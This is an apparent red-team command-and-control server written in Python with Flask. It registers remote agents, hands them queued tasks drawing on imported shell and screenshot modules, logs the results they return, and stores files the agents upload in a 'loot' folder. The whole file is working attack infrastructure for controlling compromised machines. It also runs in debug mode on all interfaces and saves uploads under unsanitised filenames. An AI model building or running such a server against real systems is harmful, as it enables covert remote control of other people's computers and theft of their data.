import os
import sys
import time
from flask import Flask, request, jsonify, send_file

# Add the project root to Python path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from c2.modules import shell, screenshot

app = Flask(__name__)
agents = {}

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    agent_id = data.get('agent_id')
    agents[agent_id] = {'ip': request.remote_addr, 'tasks': [], 'last_seen': time.time()}
    print(f"[+] Agent registered: {agent_id[:8]}... from {request.remote_addr}")
    return jsonify({'status': 'registered'}), 200

@app.route('/status', methods=['GET'])
def status():
    """Status endpoint to check active agents"""
    active_agents = len(agents)
    return jsonify({
        'server': 'RedTeam C2',
        'active_agents': active_agents,
        'agents': {aid[:8] + '...': {'ip': info['ip'], 'tasks_pending': len(info['tasks'])} 
                  for aid, info in agents.items()}
    }), 200

@app.route('/task/<agent_id>', methods=['GET', 'POST'])
def task(agent_id):
    if request.method == 'POST':
        # Add new task for agent
        task = request.json['task']
        agents[agent_id]['tasks'].append(task)
        return jsonify({'status': 'task added'}), 200
    else:
        # Agent fetches next task
        tasks = agents[agent_id]['tasks']
        agents[agent_id]['tasks'] = []
        return jsonify({'tasks': tasks}), 200

@app.route('/result/<agent_id>', methods=['POST'])
def result(agent_id):
    result = request.json
    print(f"[+] Result from {agent_id}: {result}")
    return jsonify({'status': 'received'}), 200

# Example: serve screenshot
@app.route('/upload/<agent_id>', methods=['POST'])
def upload(agent_id):
    file = request.files['file']
    path = f"loot/{agent_id}_{file.filename}"
    file.save(path)
    return jsonify({'status': f'File saved as {path}'}), 200

if __name__ == '__main__':
    os.makedirs('loot', exist_ok=True)
    print("[+] Starting RedTeam C2 Server...")
    print("[+] Server will be available at: http://127.0.0.1:8080")
    print("[+] Press Ctrl+C to stop the server")
    app.run(host='0.0.0.0', port=8080, debug=True)